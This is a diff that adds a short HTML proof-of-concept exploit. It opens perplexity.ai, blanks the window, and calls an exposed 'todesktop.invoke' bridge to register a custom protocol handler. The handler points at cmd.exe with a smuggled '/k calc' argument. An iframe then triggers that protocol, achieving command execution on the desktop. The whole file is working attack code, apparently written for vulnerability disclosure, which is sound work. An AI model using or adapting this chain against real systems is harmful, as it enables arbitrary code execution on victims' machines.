@@ -1,0 +1,15 @@
+<!DOCTYPE HTML>
+<html>
+<h1>poc</h1>
+<script>
+function frame1(){
+var x = document.createElement('iframe');
+x.src = 'customprotocol1://x';
+document.body.appendChild(x);
+};
+var nw = open('https://perplexity.ai');
+nw.location = 'about:blank';
+setTimeout(function(){
+nw.todesktop.invoke({metadata:{invoke:{version:'1.1.1'}},payload:{command:{namespace:"app",method:"setAsDefaultProtocolClient",property:"z",eventName:"",args:['customprotocol1','c:\\windows\\system32\\cmd.exe" /k calc"']}}}).then(frame1());
+},'3000');
+</script>
